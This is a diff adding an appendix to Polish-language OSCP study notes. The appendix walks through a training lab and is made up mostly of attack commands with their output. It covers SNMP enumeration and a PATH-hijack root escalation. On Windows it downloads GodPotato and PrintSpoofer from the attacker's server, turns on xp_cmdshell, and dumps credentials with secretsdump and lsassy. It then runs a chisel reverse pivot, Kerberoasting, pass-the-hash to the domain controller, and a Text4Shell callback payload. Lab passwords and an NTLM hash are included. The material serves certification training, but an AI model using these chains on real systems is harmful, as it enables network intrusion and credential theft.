@@ -3384,3 +3384,103 @@ proxychains -q bloodhound-python -u web_svc -p Diamond1 -d oscp.exam -ns 10.10.2
   U mnie sql_svc nie złamał się (rockyou/best64/dive ani custom słownik z cewl+nazwiska). Na egzaminie to konto ZWYKLE łamie się rockyou — jeśli nie, buduj custom słownik: `cewl -d 3 -m 3 <każda strona> > words.txt`, potem `hashcat -m 13100 kerb.txt words.txt -r rules/best64.rule` oraz hybryda `-a 6 words.txt ?d?d?d`.
 - **.144:** wystawiony `.git` w web-root → `git-dumper http://192.168.224.144/.git/ out` → w historii creds do bazy „staff" (`dean:BreakingBad92`) i podatny custom-API (`export.php` = zapis pliku). Uwaga: apka nie była u mnie wdrożona pod znaną ścieżką — dokończenie wymaga znalezienia deploymentu.
 - **.145:** port 1978 = **RemoteMouse 3.008 RCE** → `msfconsole` → `use exploit/windows/misc/remote_mouse_rce` (jeden dozwolony strzał MSF na egzaminie). Wymaga aktywnej sesji pulpitu na celu.
+
+---
+
+# Appendix E — OSCP Challenge Lab B (walkthrough, styl kursowy)
+
+> 6 maszyn: 3 standalone (`.149`,`.150`,`.151`) + 3 w AD `oscp.exam` (MS01 `.147`, DC01 `10.10.224.146`, MS02 `10.10.224.148`). Assumed-breach do AD: `Eric.Wallows : EricLikesRunning800`. `<KALI>`=tun0. Wynik: **.149 root, .151 SYSTEM, AD → DC01 przejęte** (5/6). `.150` — patrz E.7.
+
+## E.1 Rozpoznanie
+```bash
+nmap -sV -p- --min-rate 2000 192.168.224.147   # MS01: 21,445,5985(WinRM),8000/8080/8443(web) -> AD entry
+nmap -sV -p- --min-rate 2000 192.168.224.149   # 21(vsftpd),22,80 -> UWAGA sprawdz tez UDP!
+nmap -sV -p- --min-rate 2000 192.168.224.150   # 22, 8080 (Spring/Tomcat)
+nmap -sV -p- --min-rate 2000 192.168.224.151   # 80,3389,5060(FreeSWITCH),8081
+```
+
+## E.2 Standalone .149 — SNMP → SSH → SUID → root
+```bash
+# TCP nic nie dalo (web=default Apache, FTP anon off) -> skan UDP:
+nmap -sU --top-ports 100 192.168.224.149        # 161/udp open snmp
+onesixtyone 192.168.224.149 public              # community "public" dziala
+snmpwalk -v2c -c public 192.168.224.149 1.3.6.1.4.1.8072.1.3.2   # NET-SNMP extend
+#   -> skrypt "RESET_PASSWD" resetuje haslo usera kiero do domyslnego; userzy john, kiero
+# domyslne haslo:
+nxc ftp 192.168.224.149 -u kiero -p kiero       # [+] kiero:kiero
+# FTP jako kiero -> prywatne klucze SSH:
+ftp kiero:kiero -> get id_rsa (klucz usera john)
+ssh -i id_rsa john@192.168.224.149              # cat ~/local.txt
+# privesc: SUID binarka RESET_PASSWD wola 'chpasswd' bez sciezki -> PATH hijack:
+cd /tmp; printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > chpasswd
+chmod +x chpasswd; export PATH=/tmp:$PATH; /home/john/RESET_PASSWD
+/tmp/rootbash -p -c 'cat /root/proof.txt'
+```
+
+## E.3 Standalone .151 — FreeSWITCH → SYSTEM
+```bash
+# port 5060 = FreeSWITCH; mod_event_socket (port 8021, haslo domyslne "ClueCon") = RCE
+searchsploit FreeSWITCH                          # 47799
+# event-socket: polacz 8021, auth ClueCon, "api system <cmd>" zwraca output (RCE jako oscp\chris)
+python3 free.py 'whoami'                          # oscp\chris
+python3 free.py 'type C:\Users\chris\Desktop\local.txt'
+# privesc: chris ma SeImpersonate -> GodPotato:
+python3 free.py 'certutil -urlcache -split -f http://<KALI>:8000/GodPotato-NET4.exe C:\Windows\Temp\gp.exe'
+python3 free.py 'C:\Windows\Temp\gp.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\proof.txt"'
+```
+
+## E.4 AD — foothold MS01 + local privesc (SeImpersonate)
+```bash
+# assumed breach: Eric.Wallows ma WinRM na MS01 (jest w "Remote Management Users"):
+nxc winrm 192.168.224.147 -u Eric.Wallows -p 'EricLikesRunning800'   # (Pwn3d!)
+evil-winrm -i 192.168.224.147 -u Eric.Wallows -p 'EricLikesRunning800'
+#   whoami /priv -> SeImpersonatePrivilege ; ipconfig -> dual-homed 10.10.224.147
+# local privesc: SeImpersonate -> PrintSpoofer, dodaj Eric do lokalnych adminow:
+iwr http://<KALI>:8000/PrintSpoofer64.exe -OutFile ps.exe
+.\ps.exe -c "cmd /c net localgroup Administrators oscp\Eric.Wallows /add"
+# teraz Eric = lokalny admin -> secretsdump (LSA autologon):
+impacket-secretsdump 'oscp.exam/Eric.Wallows:EricLikesRunning800@192.168.224.147'
+#   -> DefaultPassword (autologon): celia.almeda : 7k8XHk3dMtmpnC7
+```
+
+## E.5 AD — pivot + Kerberoasting
+```bash
+# postaw pivot chisel przez MS01 (Eric admin -> scheduled task jako SYSTEM zeby persystentnie):
+#   Kali: chisel server -p 8080 --reverse
+#   MS01: schtasks /create /tn p /tr "C:\...\ch.exe client <KALI>:8080 R:socks" /sc onstart /ru SYSTEM /f; schtasks /run /tn p
+# internal: DC01=10.10.224.146, MS02=10.10.224.148
+proxychains -q nxc smb 10.10.224.146 10.10.224.148 -u Eric.Wallows -p 'EricLikesRunning800' -d oscp.exam
+# Kerberoast (uwaga clock skew -> faketime):
+faketime -f '+7h' proxychains -q impacket-GetUserSPNs -dc-ip 10.10.224.146 \
+  oscp.exam/Eric.Wallows:'EricLikesRunning800' -request -outputfile kerb.txt
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
+#   -> web_svc:Diamond1 ; sql_svc:Dolphin1
+```
+
+## E.6 AD — SQL Server (MS02) → SYSTEM → Domain Admin → DC01
+```bash
+# sql_svc jest sysadmin na MSSQL (MS02). Wlacz xp_cmdshell:
+faketime -f '+7h' proxychains -q impacket-mssqlclient oscp.exam/sql_svc:'Dolphin1'@10.10.224.148 -windows-auth
+#   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+#   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+#   SQL> EXEC xp_cmdshell 'whoami';   -> nt service\mssql$sqlexpress (ma SeImpersonate)
+# MS02 nie siega Kali -> hostuj GodPotato na MS01 (Everyone-READ share) i pobierz z niego:
+#   MS01(Eric admin): mkdir C:\tools; copy gp.exe C:\tools; net share tools=C:\tools /grant:Everyone,READ
+#   MSSQL> EXEC xp_cmdshell 'copy \\10.10.224.147\tools\gp.exe C:\Windows\Temp\gp.exe'
+#   MSSQL> EXEC xp_cmdshell 'C:\Windows\Temp\gp.exe -cmd "cmd /c net localgroup Administrators oscp\Eric.Wallows /add"'
+# Eric admin na MS02 -> wyciagnij DA z pamieci (LSASS/Mimikatz):
+proxychains -q nxc smb 10.10.224.148 -u Eric.Wallows -p 'EricLikesRunning800' -d oscp.exam -M lsassy
+#   -> OSCP\Administrator NTLM 59b280ba707d22e3ef0aa587fc29ffe5 (DA w pamieci!)
+# Pass-the-Hash na DC01 -> proof.txt + pelna domena:
+proxychains -q impacket-wmiexec -hashes :59b280ba707d22e3ef0aa587fc29ffe5 oscp.exam/Administrator@10.10.224.146
+#   type C:\Users\Administrator\Desktop\proof.txt
+proxychains -q impacket-secretsdump -just-dc -hashes :59b280ba707d22e3ef0aa587fc29ffe5 oscp.exam/Administrator@10.10.224.146  # krbtgt itd.
+```
+
+## E.7 .150 (Spring/Tomcat) — Text4Shell (do dokończenia)
+```bash
+# app REST: GET /search?query=  -> podatne na interpolacje ${...} (Apache Commons Text, CVE-2022-42889)
+# potwierdzone: url: lookup dziala (blind SSRF):
+curl -G http://192.168.224.150:8080/search --data-urlencode 'query=${url:UTF-8:http://<KALI>:8000/x}'   # -> callback na twoj serwer
+```
+> STATUS: potwierdzony blind SSRF przez `${url:...}` (interpolacja w sinku logowania — output niewidoczny). `${script:javascript:...}` (RCE) oraz `${file:}`/`${sys:}` NIE rozwiązują się (ograniczony zestaw lookupów), więc bezpośrednie RCE tym payloadem nie wyszło. Następny krok: wersja Commons Text z działającym `script:` daje RCE `${script:javascript:java.lang.Runtime.getRuntime().exec(...)}`; albo użyć SSRF do wewnętrznej usługi. NIEUKOŃCZONE.
